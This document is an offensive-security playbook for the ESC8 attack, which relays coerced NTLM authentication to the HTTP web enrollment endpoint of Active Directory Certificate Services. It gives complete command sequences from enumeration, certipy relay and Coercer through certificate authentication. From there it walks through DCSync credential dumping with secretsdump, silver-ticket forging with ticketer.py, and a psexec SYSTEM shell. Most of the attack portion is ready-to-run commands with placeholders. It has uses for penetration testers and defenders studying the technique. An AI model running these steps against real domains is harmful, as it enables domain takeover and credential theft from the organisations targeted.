# ESC8—NTLM Relay to AD CS HTTP Endpoints

## Theory

> [!Overview] Title
> ESC8 abuses **NTLM relay** to AD CS **HTTP web enrollment endpoints** (e.g., `http://<ADCS_HOST_FQDN>/certsrv/certfnsh.asp`). If HTTP enrollment is enabled and a template that allows **machine enrollment** with **Client Authentication** EKU is published (e.g., `Machine`/`Computer`, or `DomainController`), an attacker who coerces NTLM auth from a domain computer can relay it to the CA and obtain a certificate that **authenticates as that computer/user**. From a computer account cert (esp. a DC), the attacker can perform **DCSync** or forge **silver tickets** to gain high privileges.

## Requirements

* **Web Enrollment** endpoint enabled on AD CS (HTTP/S).
* **Template** published that allows **domain computer enrollment** and **Client Authentication** (e.g., `Machine`/`Computer`; for DCs: `DomainController`).
* Ability to **coerce/capture NTLM** from a target machine (e.g., PrinterBug, PetitPotam, Coercer).
* Network access from attacker to **ADCS HTTP endpoint** and to target for coercion.
 
---

## Linux

### (Optional) SSH SOCKS Proxy

```bash
sshpass -p '<ATTACK_BOX_PASS>' ssh -N -f -D 127.0.0.1:9050 <ATTACK_BOX_USER>@<ATTACK_BOX_IP>
# If sshpass is missing, omit it and enter the password interactively.
```

#### Proxychains4 snippet

```bash
# /etc/proxychains.conf
#proxy_dns
[ProxyList]
socks4  127.0.0.1 9050
```

### Network Enumeration

```bash
nmap -sn <SUBNET_CIDR>
# Identify <DC_IP>, <ADCS_IP>, etc.

nmap <DC_IP>,<ADCS_IP> -sC -sV -oN nmapscan.txt
# Confirm HTTP/HTTPS on <ADCS_IP>, NTLM enabled, IIS version, etc.
```

### Enumerate AD CS with Certipy

```bash
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: Web Enrollment: Enabled; Request Disposition: Issue (ESC8)
# Templates: Machine/Computer or DomainController available for enrollment
```

---

## ESC8 Abuse (Linux)

### Step 1 — Start NTLM Relay to AD CS HTTP Endpoint

> Choose `<RELAY_TEMPLATE>` as `DomainController` when coercing a DC; otherwise `Machine`/`Computer` for workstations/servers.

```bash
sudo certipy relay -target <ADCS_IP> -template <RELAY_TEMPLATE>
# Targets http://<ADCS_IP>/certsrv/certfnsh.asp (ESC8) and listens on 0.0.0.0:445
```

### Step 2 — Coerce Authentication from Target

> Use any coercion vector (Coercer, PetitPotam, PrinterBug, etc.). Example with **Coercer**:

```bash
coercer coerce -l <LISTEN_IP> -t <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMAIN> -v
# When prompted: Continue (C) | Skip (S) | Stop (X) -> choose C until a hit, then X
```

### Step 3 — Receive and Save Relayed Certificate

> In the `certipy relay` console you should see something like `<DOMAIN>\\<DC_HOSTNAME>$` and a PFX written.

```text
[*] Requesting certificate for '<DOMAIN>\\<DC_HOSTNAME>$' based on template '<RELAY_TEMPLATE>'
[*] Certificate has no object SID
[*] Saved certificate and private key to '<PFX_FILE>'
```

### Step 4 — Authenticate with the Issued Certificate

```bash
certipy auth -pfx '<PFX_FILE>'
# => writes Kerberos ccache (e.g., '<CCACHE_FILE>') and may print NT hash for the account
```

---

## Post-Exploitation Paths

### A) DCSync (preferred when cert is for a DC)

Using the **TGT/ccache**:

```bash
KRB5CCNAME=<CCACHE_FILE> secretsdump.py -k -no-pass <DC_FQDN>
# Dumps NTDS.DIT secrets, including <DOMAIN>\\Administrator NT hash
```

Using the **NT hash** directly:

```bash
secretsdump.py '<DC_HOSTNAME>$'@<DC_FQDN> -hashes :<NTHASH>
```

### B) Silver Ticket (when cert/hash is for a non-DC machine)

1. Get **Domain SID**:

```bash
lookupsid.py '<MACHINE_ACCOUNT>$'@<DC_IP> -hashes :<NTHASH>
# Domain SID: <DOMAIN_SID>
```

2. Forge **Silver Ticket** for a service (e.g., CIFS):

```bash
ticketer.py -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<DC_FQDN> Administrator
# Saves Administrator.ccache
```

3. Use **Pass-the-Ticket** (example with PsExec):

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <DC_FQDN>
# Expect a SYSTEM shell on <DC_HOSTNAME>
```

---

## Notes & Troubleshooting

* If `certipy find` can’t enumerate templates via CSRA, try RRP (certipy does this automatically). You only need Web Enrollment **enabled** + a suitable template.
* If `certipy relay` times out, ensure port 445 from target to attacker is reachable and that your coercion actually triggers NTLM to your listener.
* Some hosts harden coercion paths; try multiple vectors or different machines.
* For non-DC machines, use the `Machine`/`Computer` template and pick an SPN relevant to your target when forging silver tickets (e.g., `cifs/<HOST_FQDN>`, `host/<HOST_FQDN>`).
* Ensure DNS/hosts resolution when using Kerberos (`/etc/hosts` or proper DNS).
